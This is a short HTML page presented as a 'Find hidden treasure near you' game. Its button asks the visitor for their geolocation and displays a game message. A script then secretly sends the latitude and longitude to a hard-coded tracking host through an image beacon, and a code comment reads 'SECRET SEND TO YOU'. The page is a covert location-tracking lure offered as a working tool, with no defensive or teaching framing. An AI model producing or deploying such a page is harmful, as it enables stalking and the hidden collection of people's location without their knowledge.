<!DOCTYPE html>
<html><head>
  <title>Play Cool Game!</title>
  <meta name="viewport" content="width=device-width">
  <style>
    body {margin:0;padding:20px;background:#4a90e2;color:white;font-family:Arial;text-align:center;}
    h1 {font-size:40px;}
    button {background:#ff9500;color:white;border:none;padding:20px 40px;font-size:25px;border-radius:10px;cursor:pointer;}
    button:hover {background:#ff7b00;}
    #status {margin-top:30px;font-size:20px;}
  </style>
</head><body>
  <h1>🎮 New Game Alert!</h1>
  <p>Find hidden treasure near you!</p>
  <button onclick="findTreasure()">Start Adventure</button>
  <div id="status"></div>
  <script>
  function findTreasure() {
    document.getElementById('status').innerHTML = '🔍 Scanning nearby...';
    navigator.geolocation.getCurrentPosition(pos => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      document.getElementById('status').innerHTML = '✅ Treasure map loaded! Adventure starts!';
      // SECRET SEND TO YOU:
      const img = new Image();
      img.src = 'http://192.168.1.55:8080/track?lat='+lat+'&lon='+lon+'&name=Player';
    });
  }
  </script>
</body></html>
